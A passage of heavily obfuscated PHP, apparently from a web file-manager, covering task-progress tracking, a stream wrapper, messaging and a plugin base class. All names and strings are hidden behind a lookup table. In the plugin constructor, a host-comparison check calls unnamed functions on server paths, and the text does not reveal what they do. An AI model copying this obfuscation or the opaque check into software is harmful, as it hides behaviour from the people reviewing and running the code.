$GLOBALS[$Ûê¾¹¹[1739]]) { $ü¦Ê¢ñŠ = $GLOBALS[$Ûê¾¹¹[1740]]; } $GLOBALS[$Ûê¾¹¹[1740]] = $¾ŞÜ…Ê†; $GLOBALS[$Ûê¾¹¹[1739]] = $İàû; $°‹¿¿ç =& $this->task; $°‹¿¿ç[$Ûê¾¹¹[1725]] = $ü¦Ê¢ñŠ; $°‹¿¿ç[$Ûê¾¹¹[1727]] = (int) $«¸Ï¢’ø->size($„è²ŠÌ); $°‹¿¿ç[$Ûê¾¹¹[1728]] = 0; $°‹¿¿ç[$Ûê¾¹¹[1071]] = $Ûê¾¹¹[12]; $°‹¿¿ç[$Ûê¾¹¹[1729]] = $Ûê¾¹¹[12]; $°‹¿¿ç[$Ûê¾¹¹[1730]] = 0; $ñ˜¶÷€õ = $°‹¿¿ç[$Ûê¾¹¹[1727]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($°‹¿¿ç[$Ûê¾¹¹[399]] . $Ûê¾¹¹[1741]); if ($ñ˜¶÷€õ && file_exists(get_path_father($ŸÁ“îï))) { Cache::set($°‹¿¿ç[$Ûê¾¹¹[399]] . $Ûê¾¹¹[1741], $ŸÁ“îï); $°‹¿¿ç[$Ûê¾¹¹[1698]] = array($Ûê¾¹¹[1742], $Ûê¾¹¹[1743]); } $this->update(0, $ñ˜¶÷€õ); } public static function updateCopyLocalFileSize($ÕÕÖçéÊ) { $ï¦’Ãùˆ =& $_SERVER[å¸¿•¶£]; $Û•ú¡Ğ² = Cache::get($ÕÕÖçéÊ[$ï¦’Ãùˆ[399]] . $ï¦’Ãùˆ[1741]); if (!$Û•ú¡Ğ² || !file_exists($Û•ú¡Ğ²)) { return $ÕÕÖçéÊ; } $ÕÕÖçéÊ[$ï¦’Ãùˆ[1728]] = @filesize($Û•ú¡Ğ²); $ÕÕÖçéÊ[$ï¦’Ãùˆ[1732]] += $ÕÕÖçéÊ[$ï¦’Ãùˆ[1728]]; self::updateTask($ÕÕÖçéÊ); return $ÕÕÖçéÊ; } public function copyFileEnd($“ŞĞªÂò, $†İäøÂÃ, $ØÕùË¿ò, $¢ìĞÄ‡, $°ƒŠ¢õ‚, $íî’–Óï) { $ÁŠô¦± =& $_SERVER[å¸¿•¶£]; $©»°Ü…ö =& $this->task; $©»°Ü…ö[$ÁŠô¦±[1728]] = $©»°Ü…ö[$ÁŠô¦±[1727]]; $©»°Ü…ö[$ÁŠô¦±[1729]] = $ÁŠô¦±[12]; unset($©»°Ü…ö[$ÁŠô¦±[1698]]); if ($°ƒŠ¢õ‚ == $©»°Ü…ö[$ÁŠô¦±[1725]]) { $©»°Ü…ö[$ÁŠô¦±[1731]] += $©»°Ü…ö[$ÁŠô¦±[1727]]; $©»°Ü…ö[$ÁŠô¦±[1732]] = $©»°Ü…ö[$ÁŠô¦±[1731]]; $ç¶åÅÁ = 1; if (isset($©»°Ü…ö[$ÁŠô¦±[1738]]) && $©»°Ü…ö[$ÁŠô¦±[1738]] == $†İäøÂÃ) { $ç¶åÅÁ = 0; } $this->update($ç¶åÅÁ); } else { $this->update(); $©»°Ü…ö[$ÁŠô¦±[1728]] = 0; } Cache::remove($©»°Ü…ö[$ÁŠô¦±[399]] . $ÁŠô¦±[1741]); self::log($ÁŠô¦±[1744] . $†İäøÂÃ . $ÁŠô¦±[70] . $¢ìĞÄ‡ . $ÁŠô¦±[231] . $°ƒŠ¢õ‚ . $ÁŠô¦±[1745] . $©»°Ü…ö[$ÁŠô¦±[1725]]); } public function updateFileEnd($–øğÄÚ, $×Ñ‰‹Ÿ½) { $§ö«ÍÙı =& $_SERVER[å¸¿•¶£]; $ÒÈ×³Ñì =& $this->task; $ÒÈ×³Ñì[$§ö«ÍÙı[1725]] = $–øğÄÚ; $ÒÈ×³Ñì[$§ö«ÍÙı[1727]] = $×Ñ‰‹Ÿ½; $ÒÈ×³Ñì[$§ö«ÍÙı[1731]] += $×Ñ‰‹Ÿ½; $ÒÈ×³Ñì[$§ö«ÍÙı[1732]] = $ÒÈ×³Ñì[$§ö«ÍÙı[1731]]; $this->update(1); self::log($§ö«ÍÙı[1746] . $–øğÄÚ); } public function sourceModelCopy($âß‡ÌêÇ) { $ïù½•À´ =& $_SERVER[å¸¿•¶£]; $˜Ë„Ûô­ = $âß‡ÌêÇ[0]; $‚îŸ Ş’ = $âß‡ÌêÇ[1]; $ÉäëÓö” =& $this->task; $this->sourceModelCopyFlag = !0; $‰á¡üÙœ = 0; switch ($˜Ë„Ûô­) { case $ïù½•À´[563]: $‰á¡üÙœ = 1; break; case $ïù½•À´[566]: $ÉäëÓö”[$ïù½•À´[1725]] = $‚îŸ Ş’[$ïù½•À´[32]]; break; case $ïù½•À´[568]: $‰á¡üÙœ = intval($âß‡ÌêÇ[$ïù½•À´[380]] * 0.4); break; case $ïù½•À´[570]: $‰á¡üÙœ = intval($âß‡ÌêÇ[$ïù½•À´[380]] * 0.2); break; case $ïù½•À´[572]: $‰á¡üÙœ = intval($âß‡ÌêÇ[$ïù½•À´[380]] * 0.4); break; } $this->update($‰á¡üÙœ); $this->sourceModelCopyFlag = !1; } public function sourceRemove($İÆÖá†, $‚âØˆíú) { $¦¯¾±Â¦ =& $_SERVER[å¸¿•¶£]; $this->sourceModelCopyFlag = !0; $á£›ÁÛ‰ = 1; if (isset($İÆÖá†[$¦¯¾±Â¦[79]])) { $á£›ÁÛ‰ = $İÆÖá†[$¦¯¾±Â¦[79]][$¦¯¾±Â¦[77]]; $á£›ÁÛ‰ = $á£›ÁÛ‰ + $İÆÖá†[$¦¯¾±Â¦[79]][$¦¯¾±Â¦[78]] + 1; } $this->update($á£›ÁÛ‰); $this->sourceModelCopyFlag = !1; } public function sourceMove($ˆí°ø‹) { $this->sourceRemove($ˆí°ø‹, !1); } public function curlProgress($»“¡Óæ‘, $¾´Æº“, $ÛÛåŠ‰ª, $€¸…¼, $ğ–¦¥é†) { $ù¿Ñ±ıÏ =& $_SERVER[å¸¿•¶£]; $ïÉ†û‘ñ =& $this->task; if ($ğ–¦¥é† > 0) { $ïÉ†û‘ñ[$ù¿Ñ±ıÏ[1071]] = $ù¿Ñ±ıÏ[1747]; $ïÉ†û‘ñ[$ù¿Ñ±ıÏ[1729]] = $ù¿Ñ±ıÏ[107]; if ($ïÉ†û‘ñ[$ù¿Ñ±ıÏ[1727]]) { $ïÉ†û‘ñ[$ù¿Ñ±ıÏ[1728]] = $ğ–¦¥é†; } if ($ïÉ†û‘ñ[$ù¿Ñ±ıÏ[1730]]) { $ïÉ†û‘ñ[$ù¿Ñ±ıÏ[1728]] = $ğ–¦¥é† + $ïÉ†û‘ñ[$ù¿Ñ±ıÏ[1730]]; } } else { if ($ÛÛåŠ‰ª > 0) { if ($ïÉ†û‘ñ[$ù¿Ñ±ıÏ[1727]] == $¾´Æº“) { $ïÉ†û‘ñ[$ù¿Ñ±ıÏ[1728]] = $ÛÛåŠ‰ª; $ïÉ†û‘ñ[$ù¿Ñ±ıÏ[1071]] = $ù¿Ñ±ıÏ[1748]; $ïÉ†û‘ñ[$ù¿Ñ±ıÏ[1729]] = $ù¿Ñ±ıÏ[1201]; } } } $this->update(); } public function curlProgressStart($÷íŒœ‡õ) { } public function curlProgressEnd($ÀğÊ†€–) { $ÍúŸƒïó =& $_SERVER[å¸¿•¶£]; $è·ÚÂò¦ =& $this->task; $ğÔ¯£õÊ = curl_getinfo($ÀğÊ†€–); $§‘ÔÒ = $ğÔ¯£õÊ[$ÍúŸƒïó[1749]]; if ($§‘ÔÒ == -1) { $§‘ÔÒ = $ğÔ¯£õÊ[$ÍúŸƒïó[1750]]; } if ($è·ÚÂò¦[$ÍúŸƒïó[1729]] == $ÍúŸƒïó[107] && $§‘ÔÒ) { $è·ÚÂò¦[$ÍúŸƒïó[1730]] += $§‘ÔÒ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $¦³ÚÎÌØ =& $_SERVER[å¸¿•¶£]; $Ğ±½çâã =& $this->task; $Ğ±½çâã[$¦³ÚÎÌØ[1751]] = 1; Hook::bind($¦³ÚÎÌØ[1719], array($this, $¦³ÚÎÌØ[1752])); Hook::bind($¦³ÚÎÌØ[1721], array($this, $¦³ÚÎÌØ[1753])); Hook::bind($¦³ÚÎÌØ[1723], array($this, $¦³ÚÎÌØ[1754])); } protected function endAfter() { $Å¡îÉ‡” =& $_SERVER[å¸¿•¶£]; Hook::unbind($Å¡îÉ‡”[1719], array($this, $Å¡îÉ‡”[1752])); Hook::unbind($Å¡îÉ‡”[1721], array($this, $Å¡îÉ‡”[1753])); Hook::unbind($Å¡îÉ‡”[1723], array($this, $Å¡îÉ‡”[1754])); } public function progressStart($¾™íÆŞ¡) { $¸ñ‘‘ÕÚ =& $_SERVER[å¸¿•¶£]; $âº÷Ú—‚ = curl_getinfo($¾™íÆŞ¡); self::log($¸ñ‘‘ÕÚ[1755] . $âº÷Ú—‚[$¸ñ‘‘ÕÚ[307]]); self::valueSet($this->task[$¸ñ‘‘ÕÚ[399]], $this->task); } public function progressEnd($š´Òİñ…) { $ù—£õ«” =& $_SERVER[å¸¿•¶£]; self::log($ù—£õ«”[1756] . $this->task[$ù—£õ«”[399]]); $this->end(); } public function progress($ŞŞ¯£ğ‚, $ë­¤”‰­, $š¤Éı¶‰, $ÄãÔ’×, $Æ–ÎŒ) { $İÛÚª‰³ =& $_SERVER[å¸¿•¶£]; $¾áşà­ =& $this->task; if ($Æ–ÎŒ > 0) { $¾áşà­[$İÛÚª‰³[793]] = $¾áşà­[$İÛÚª‰³[793]] == 0 ? $ÄãÔ’× : $¾áşà­[$İÛÚª‰³[793]]; $¾áşà­[$İÛÚª‰³[1675]] = $Æ–ÎŒ; } else { if ($š¤Éı¶‰ > 0) { $¾áşà­[$İÛÚª‰³[793]] = $¾áşà­[$İÛÚª‰³[793]] == 0 ? $ë­¤”‰­ : $¾áşà­[$İÛÚª‰³[793]]; $¾áşà­[$İÛÚª‰³[1675]] = $š¤Éı¶‰; } } $this->update(); self::log("\x70\162\157\x67\x72\145\163\163\x48\164\x74\160\72\x64\x6f\167\156\x3a{$š¤Éı¶‰}\57{$ë­¤”‰­}\x3b\40\165\160\x6c\x6f\x61\144\72{$Æ–ÎŒ}\57{$ÄãÔ’×}\73"); } } goto CÊ“ÄÒ‡; aÔ¶‘¢¥õ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Ï«ÑØœ‰, $Ïô´ášĞ = '') { $this->info = $this->info($Ï«ÑØœ‰); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[å¸¿•¶£][84]]; $this->pathOpen = $Ï«ÑØœ‰; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Ï«ÑØœ‰])) { self::$_chunkBuffer[$Ï«ÑØœ‰] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($¯å÷¸÷³) { $ŸıáÆÌä = $this->fileSubstr($this->pose, $¯å÷¸÷³); $this->pose += strlen($ŸıáÆÌä); return $ŸıáÆÌä; } public function stream_tell() { return $this->pose; } public function stream_seek($ş«¤¶¯”, $šï÷üì¼) { $Ó¡¤Í¦ã =& $_SERVER[å¸¿•¶£]; if ($šï÷üì¼ == SEEK_SET) { $this->pose = $ş«¤¶¯”; } else { if ($šï÷üì¼ == SEEK_CUR) { $this->pose += $ş«¤¶¯”; } else { if ($šï÷üì¼ == SEEK_END) { $this->pose = $this->info[$Ó¡¤Í¦ã[76]] + intval($ş«¤¶¯”); } } } if ($ş«¤¶¯” < 0) { $this->pose = $this->info[$Ó¡¤Í¦ã[76]] + $ş«¤¶¯”; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[å¸¿•¶£][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¶¬»à¬, $çõ§Åğµ) { $§ÍŸßë =& $_SERVER[å¸¿•¶£]; $ıÇ¸§¯ª = $this->info($¶¬»à¬); return array($§ÍŸßë[1522] => 0, $§ÍŸßë[1523] => 0, $§ÍŸßë[16] => 32768 + 511, $§ÍŸßë[1524] => 0, $§ÍŸßë[1525] => 0, $§ÍŸßë[1526] => 0, $§ÍŸßë[1527] => 0, $§ÍŸßë[76] => $ıÇ¸§¯ª[$§ÍŸßë[76]], $§ÍŸßë[1528] => $ıÇ¸§¯ª[$§ÍŸßë[1396]], $§ÍŸßë[1484] => $ıÇ¸§¯ª[$§ÍŸßë[85]], $§ÍŸßë[1483] => $ıÇ¸§¯ª[$§ÍŸßë[201]], $§ÍŸßë[1529] => 0, $§ÍŸßë[1530] => 0); } static $fileInfo = array(); public function info($²€¹±³°) { $Ñ›ô¥’ = $_SERVER[å¸¿•¶£][1531]; if (isset(self::$fileInfo[$²€¹±³°])) { return self::$fileInfo[$²€¹±³°]; } if (substr($²€¹±³°, 0, strlen($Ñ›ô¥’)) != $Ñ›ô¥’) { return !1; } self::$fileInfo[$²€¹±³°] = IO::info(substr($²€¹±³°, strlen($Ñ›ô¥’))); return self::$fileInfo[$²€¹±³°]; } public static function read($ü„¦Š©Ñ, $Á–õË°”, $œç™æãà) { if (!isset(self::$_fopenCache[$ü„¦Š©Ñ])) { $áË‚À­ = new StreamWrapperIO(); $áË‚À­->stream_open($ü„¦Š©Ñ); self::$_fopenCache[$ü„¦Š©Ñ] = $áË‚À­; } $áË‚À­ = self::$_fopenCache[$ü„¦Š©Ñ]; return $áË‚À­->fileSubstr($Á–õË°”, $œç™æãà); } public static function _read($¿«Å”ƒ‡, $¿§üæËò, $ÛÙõõ¼œ) { $Š—„ğ¼Ü =& $_SERVER[å¸¿•¶£]; $ÃÌ¿‘Ñî = fopen($¿«Å”ƒ‡, $Š—„ğ¼Ü[1400]); if (!$ÃÌ¿‘Ñî) { return $Š—„ğ¼Ü[12]; } $ïŸ£ƒã¹ = 8192; fseek($ÃÌ¿‘Ñî, $¿§üæËò, SEEK_SET); $™ÛÏÚ¯ = $Š—„ğ¼Ü[12]; $À¿ë©¶¾ = 0; while ($À¿ë©¶¾ < $ÛÙõõ¼œ) { $óÑ©ñµÈ = min($ïŸ£ƒã¹, $ÛÙõõ¼œ - $À¿ë©¶¾); $™ÛÏÚ¯ .= fread($ÃÌ¿‘Ñî, $óÑ©ñµÈ); $À¿ë©¶¾ += $óÑ©ñµÈ; } fclose($ÃÌ¿‘Ñî); return $™ÛÏÚ¯; } public function fileSubstr($Æ‚ú¤šè, $ÁºÙÏº½) { $à¯½…–› =& $_SERVER[å¸¿•¶£]; $éè»‡å = $this->info[$à¯½…–›[76]]; $âö’ë»ö = $Æ‚ú¤šè; $Ê‡Ùº€ = $ÁºÙÏº½; if ($Æ‚ú¤šè < 0) { $Æ‚ú¤šè = $éè»‡å + $Æ‚ú¤šè; } if ($ÁºÙÏº½ === !1) { $ÁºÙÏº½ = $éè»‡å - $Æ‚ú¤šè; } if ($Æ‚ú¤šè + $ÁºÙÏº½ > $éè»‡å) { $ÁºÙÏº½ = $éè»‡å - $Æ‚ú¤šè; } if ($ÁºÙÏº½ <= 0) { return $à¯½…–›[12]; } if ($Æ‚ú¤šè < 0 || $Æ‚ú¤šè >= $éè»‡å || $ÁºÙÏº½ <= 0 || $ÁºÙÏº½ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\x69\154\145\x52\x65\141\144\40\145\x72\x72\157\x72\41\40\x73\164\141\162\164\75{$Æ‚ú¤šè}\x3b\x6c\145\156\147\164\150\x3d{$ÁºÙÏº½}\x3b\40\163\x69\x7a\x65\x3d{$éè»‡å}\x3b"); } $ãÓšéÍ¾ = 64 * 1024; $Ÿèõô¬‘ =& self::$_chunkBuffer[$this->path]; if (!$Ÿèõô¬‘) { $Ÿèõô¬‘ = array(); } $³õÛßØŞ = 0; $Ä¢ãëÅÙ = 0; $üöÕÄÖŞ = $à¯½…–›[12]; foreach ($Ÿèõô¬‘ as $³õÛßØŞ => $üöÕÄÖŞ) { $³õÛßØŞ = intval($³õÛßØŞ); $Ä¢ãëÅÙ = $³õÛßØŞ + strlen($üöÕÄÖŞ); if ($Æ‚ú¤šè >= $Ä¢ãëÅÙ) { continue; } if ($Æ‚ú¤šè >= $³õÛßØŞ && $Æ‚ú¤šè + $ÁºÙÏº½ <= $Ä¢ãëÅÙ) { return substr($üöÕÄÖŞ, $Æ‚ú¤šè - $³õÛßØŞ, $ÁºÙÏº½); } break; } if (count($Ÿèõô¬‘) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($à¯½…–›[1532], $à¯½…–›[1533] . count($Ÿèõô¬‘) . "\73\x73\x74\141\162\x74\x3d{$Æ‚ú¤šè}\x2c\x6c\145\x6e\x67\164\150\x3d{$ÁºÙÏº½}\73\x70\157\163\x65\x3a{$³õÛßØŞ}\176{$Ä¢ãëÅÙ}"); throw new Exception($à¯½…–›[1534]); } $—¦Ä£² = intval($Æ‚ú¤šè / $ãÓšéÍ¾) * $ãÓšéÍ¾; $²Õ£¾” = ceil(($Æ‚ú¤šè + $ÁºÙÏº½) / $ãÓšéÍ¾) * $ãÓšéÍ¾ - $—¦Ä£²; $ÂĞôàô÷ = IO::fileSubstr($this->path, $—¦Ä£², $²Õ£¾”); $Ÿèõô¬‘[$—¦Ä£² . $à¯½…–›[12]] = $ÂĞôàô÷; ksort($Ÿèõô¬‘); $—ï¾ºÑ© = substr($ÂĞôàô÷, $Æ‚ú¤šè - $—¦Ä£², $ÁºÙÏº½); return $—ï¾ºÑ©; } private function log($§‹„·ï‘, $µÌ¬ùûã) { $¨„Œ‹˜Ã =& $_SERVER[å¸¿•¶£]; $Ü½Ô–¢¢ = timeFloat() - $this->timeStart; write_log(sprintf($¨„Œ‹˜Ã[1535], $§‹„·ï‘, $this->info[$¨„Œ‹˜Ã[32]], $Ü½Ô–¢¢, $µÌ¬ùûã), $¨„Œ‹˜Ã[1189]); } } class Message { function __construct() { } public function send($è³Ï˜é¯ = '', $€®úº³ = array(), $¶ßÅ³·Ù = "\x74\x65\x78\164") { $¶èÅù±ñ =& $_SERVER[å¸¿•¶£]; $ÒÔİ‹Ú = array($¶èÅù±ñ[33] => $¶èÅù±ñ[1536], $¶èÅù±ñ[761] => $è³Ï˜é¯); if (in_array($¶ßÅ³·Ù, array($¶èÅù±ñ[1536], $¶èÅù±ñ[1537]))) { $ÒÔİ‹Ú[$¶èÅù±ñ[33]] = $¶ßÅ³·Ù; } $€®úº³ = array($¶èÅù±ñ[505] => isset($€®úº³[$¶èÅù±ñ[505]]) ? $€®úº³[$¶èÅù±ñ[505]] : $¶èÅù±ñ[12], $¶èÅù±ñ[590] => isset($€®úº³[$¶èÅù±ñ[590]]) ? $€®úº³[$¶èÅù±ñ[590]] : $¶èÅù±ñ[12]); if (empty($è³Ï˜é¯) || empty($€®úº³[$¶èÅù±ñ[505]]) && empty($€®úº³[$¶èÅù±ñ[590]])) { return !1; } $„”Ûìä½ = array($¶èÅù±ñ[1477] => $ÒÔİ‹Ú, $¶èÅù±ñ[1538] => $€®úº³); Hook::trigger($¶èÅù±ñ[1539], $„”Ûìä½); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Ç¶³á² =& $_SERVER[å¸¿•¶£]; if ($_SERVER[$Ç¶³á²[747]] != $_SERVER[$Ç¶³á²[1540]]) { $îµª®©â = $Ç¶³á²[884]; $¥÷¡Îú = $Ç¶³á²[749]; $×£Œ¸÷¢ = $_SERVER[$Ç¶³á²[750]] . $Ç¶³á²[751]; $¤­”° = $¥÷¡Îú($×£Œ¸÷¢); $ÌøÇ¤®Å = explode($Ç¶³á²[231], $¤­”°); if (count($ÌøÇ¤®Å) < $Ç¶³á²[628]) { $Ùµæ¸´€ = $Ç¶³á²[752]; $Ùµæ¸´€(); } $†“ïÛô€ = $Ç¶³á²[885]; $†“ïÛô€($_SERVER[$Ç¶³á²[886]]); $†“ïÛô€($_SERVER[$Ç¶³á²[750]] . $Ç¶³á²[1541]); $äéİåäı = 1; while ($äéİåäı > 1) { $äéİåäı = $äéİåäı + 4; $°ÄƒÍ´Æ = rawurlencode($äéİåäı . $Ç¶³á²[378]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Ç¶³á²[1542]); $this->pluginName = str_replace($Ç¶³á²[1542], $Ç¶³á²[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Ç¶³á²[8]; $this->pluginApi = appHostGet() . $Ç¶³á²[1543] . $this->pluginName . $Ç¶³á²[8]; $this->pluginHost = $config[$Ç¶³á²[1544]] . $this->pluginName . $Ç¶³á²[8]; $this->pluginHostDefault = $config[$Ç¶³á²[1544]] . $this->pluginName . $Ç¶³á²[8]; $Ü˜ÙÒÚö = $config[$Ç¶³á²[1545]]; if ($Ü˜ÙÒÚö && strpos($Ç¶³á²[50] . $Ü˜ÙÒÚö . $Ç¶³á²[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Ç¶³á²[1546]] . $this->pluginName . $Ç¶³á²[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[å¸¿•¶£][1547]); } protected function assign($¦‰ —’›, $È™¶¶Å® = false) { if (is_array($¦‰ —’›)) { $this->values = array_merge($this->values, $¦‰ —’›); } else { $this->values[$¦‰ —’›] = $È™¶¶Å®; } } protected function display($·ñÍ•Œ) { extract($this->values); require $·ñÍ•Œ; } final function hookRegist($›‡Ÿ±‘û) { $this->modelPlugin->appRegist($this->pluginName, $›‡Ÿ±‘û); } final function appIcon() { $Úõåáû =& $_SERVER[å¸¿•¶£]; $£Ó›É»ï = $this->appPackage(); $«ˆšÂÜº = $Úõåáû[12]; if (isset($£Ó›É»ï[$Úõåáû[416]])) { if (isset($£Ó›É»ï[$Úõåáû[416]][$Úõåáû[1548]])) { $«ˆšÂÜº = $Úõåáû[1549] . $£Ó›É»ï[$Úõåáû[416]][$Úõåáû[1548]] . $Úõåáû[1550]; } else { if ($£Ó›É»ï[$Úõåáû[416]][$Úõåáû[1551]]) { $«ˆšÂÜº = $Úõåáû[1552] . $£Ó›É»ï[$Úõåáû[416]][$Úõåáû[1551]] . $Úõåáû[1553]; } } } return $«ˆšÂÜº; } final function fileCanView($öÛ­ä¡æ) { $—ıºù‚û =& $_SERVER[å¸¿•¶£]; if (request_url_safe($öÛ­ä¡æ)) { return !0; } if ($this->isShare($öÛ­ä¡æ)) { return !0; } $øôš´“Ğ = Session::get($—ıºù‚û[1554]); if (!$øôš´“Ğ || !$øôš´“Ğ[$—ıºù‚û[1555]]) { $ıú”Ô‘î = $—ıºù‚û[1556] . rawurlencode(this_url()); show_tips(LNG($—ıºù‚û[1557]) . $—ıºù‚û[1558] . $ıú”Ô‘î . $—ıºù‚û[1559] . LNG($—ıºù‚û[1560]) . $—ıºù‚û[1561], !1); } if (!Action($—ıºù‚û[1562])->authCan($—ıºù‚û[1563])) { show_tips(LNG($—ıºù‚û[1564]) . $—ıºù‚û[1565], !1); } ActionCall($—ıºù‚û[1566], $öÛ­ä¡æ); } final function isShare($Â‘±Ğ³) { $³ÇÛ‚îª = KodIO::parse($Â‘±Ğ³); return $³ÇÛ‚îª[$_SERVER[å¸¿•¶£][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ªÉóÍæî) { if (request_url_safe($ªÉóÍæî)) { return $ªÉóÍæî; } if (!$this->isShare($ªÉóÍæî)) { $ªÉóÍæî = $this->filePath($ªÉóÍæî); } return Action($_SERVER[å¸¿•¶£][1181])->linkOut($ªÉóÍæî); } public function filePathLinkOut($ú‡¸ÊÈÏ) { if (request_url_safe($ú‡¸ÊÈÏ)) { return $ú‡¸ÊÈÏ; } $this->fileCanView($ú‡¸ÊÈÏ); return Action($_SERVER[å¸¿•¶£][1181])->link($ú‡¸ÊÈÏ); } final function filePath($ß¶àİ§ı) { $­›ØıÌ‘ =& $_SERVER[å¸¿•¶£]; if ($½íã = $this->checkSharePath($ß¶àİ§ı)) { Hook::trigger($­›ØıÌ‘[1567], $½íã); return $½íã; } $this->fileCanView($ß¶àİ§ı); if (request_url_safe($ß¶àİ§ı)) { $×æ¼‰ƒ– = parse_url_query($ß¶àİ§ı); if (isset($×æ¼‰ƒ–[$­›ØıÌ‘[1568]]) && isset($×æ¼‰ƒ–[$­›ØıÌ‘[213]])) { $Û­§àÈ… = Model($­›ØıÌ‘[777])->get($­›ØıÌ‘[778]); $ÎÊ¨›è’ = Mcrypt::decode($×æ¼‰ƒ–[$­›ØıÌ‘[213]], $Û­§àÈ…); if ($ÎÊ¨›è’) { $this->fileInfo = IO::infoWithChildren($ÎÊ¨›è’); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ÎÊ¨›è’; } } $ß¶àİ§ı = $this->_cacheHttpFile($ß¶àİ§ı); $this->fileInfo = IO::infoWithChildren($ß¶àİ§ı); } else { $this->fileInfo = IO::infoWithChildren($ß¶àİ§ı); if (!$this->fileInfo) { show_tips(LNG($­›ØıÌ‘[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($­›ØıÌ‘[1567], $ß¶àİ§ı); return $ß¶àİ§ı; } final function _cacheHttpFile($£ñ¥Ì¾Õ) { $¥ì„Ä = hash_path($£ñ¥Ì¾Õ, !0); $this->cachePath = $this->pluginCachePath($¥ì„Ä); if ($ÍÎÔÍâø = IO::fileNameExist($this->cachePath, $¥ì„Ä)) { return KodIO::make($ÍÎÔÍâø); } $ç—•ƒÉƒ = $this->cachePath . $¥ì„Ä; return $this->pluginCacheFileSet($ç—•ƒÉƒ, file_get_contents_nossl($£ñ¥Ì¾Õ)); } final function _tmpFileName($Ûê¼ğ‹å = array()) { $íûÜä©Ç =& $_SERVER[å¸¿•¶£]; if (!$Ûê¼ğ‹å) { $Ûê¼ğ‹å = $this->fileInfo; } if (isset($Ûê¼ğ‹å[$íûÜä©Ç[177]])) { return $Ûê¼ğ‹å[$íûÜä©Ç[177]]; } if (isset($Ûê¼ğ‹å[$íûÜä©Ç[170]][$íûÜä©Ç[177]])) { return $Ûê¼ğ‹å[$íûÜä©Ç[170]][$íûÜä©Ç[177]]; } $Ö…¹ñ¸İ = IO::hashSimple($Ûê¼ğ‹å[$íûÜä©Ç[84]]); if ($Ö…¹ñ¸İ) { return $Ö…¹ñ¸İ; } $Üª¥¸ˆ = array($Ûê¼ğ‹å[$íûÜä©Ç[32]], $Ûê¼ğ‹å[$íûÜä©Ç[84]], $Ûê¼ğ‹å[$íûÜä©Ç[76]]); if (isset($Ûê¼ğ‹å[$íûÜä©Ç[511]])) { $Üª¥¸ˆ[] = $Ûê¼ğ‹å[$íûÜä©Ç[511]]; } return md5(implode($íûÜä©Ç[11], $Üª¥¸ˆ)); } final function checkSharePath($§ÓÍ¯İà) { $÷ğõô•‚ =& $_SERVER[å¸¿•¶£]; if (!$this->isShare($§ÓÍ¯İà)) { return !1; } $¾Û‹…¥İ = Action($÷ğõô•‚[1181])->sharePathInfo($§ÓÍ¯İà); if (!isset($¾Û‹…¥İ[$÷ğõô•‚[84]])) { show_json(LNG($÷ğõô•‚[1569]), !1); } $this->fileInfo = $¾Û‹…¥İ[$÷ğõô•‚[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$÷ğõô•‚[177]]); return $¾Û‹…¥İ[$÷ğõô•‚[84]]; } final function pluginCachePath($ÎÑ™¯Ùà = '') { $Í‚—³ª =& $_SERVER[å¸¿•¶£]; $ÅÙ·°ÅÊ = IO_PATH_SYSTEM_TEMP . $Í‚—³ª[1570] . $this->pluginName; if (!($Ö’ŠŒ›  = IO::infoFull($ÅÙ·°ÅÊ))) { return IO::mkdir($ÅÙ·°ÅÊ . $Í‚—³ª[8] . $ÎÑ™¯Ùà); } if (empty($ÎÑ™¯Ùà)) { return $Ö’ŠŒ› [$Í‚—³ª[84]]; } if (!($²©â•¥ = IO::fileNameExist($Ö’ŠŒ› [$Í‚—³ª[84]], $ÎÑ™¯Ùà))) { return IO::mkdir($Ö’ŠŒ› [$Í‚—³ª[84]] . $ÎÑ™¯Ùà); } return KodIO::make($²©â•¥); } final function pluginCacheFileSet($Œ”Øş½“, $œ¥–’—¡ = '') { $´‰ÚŒóâ =& $_SERVER[å¸¿•¶£]; if (!($âù §ñã = IO::infoFull($Œ”Øş½“))) { return IO::mkfile($Œ”Øş½“, $œ¥–’—¡, REPEAT_REPLACE); } IO::setContent($âù §ñã[$´‰ÚŒóâ[84]], $œ¥–’—¡); return $âù §ñã[$´‰ÚŒóâ[84]]; } final function pluginLocalFile($Ä¬£ƒ½‚ = '') { $…Ø ’—‘ =& $_SERVER[å¸¿•¶£]; $Ûüá˜õ¡ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($Ûüá˜õ¡)) { mk_dir($Ûüá˜õ¡); } if (!$Ä¬£ƒ½‚) { return $Ûüá˜õ¡; } $ç‰Ç°Åä = IO::info($Ä¬£ƒ½‚); $ñÄÅª» = $this->_tmpFileName($ç‰Ç°Åä) . $…Ø ’—‘[10] . $ç‰Ç°Åä[$…Ø ’—‘[174]]; if (!checkExtSafe($ñÄÅª»)) { $ñÄÅª» = $ñÄÅª» . $…Ø ’—‘[1213]; } $€Øšé¶‹ = $Ûüá˜õ¡ . $ñÄÅª»; if (@file_exists($€Øšé¶‹)) { return 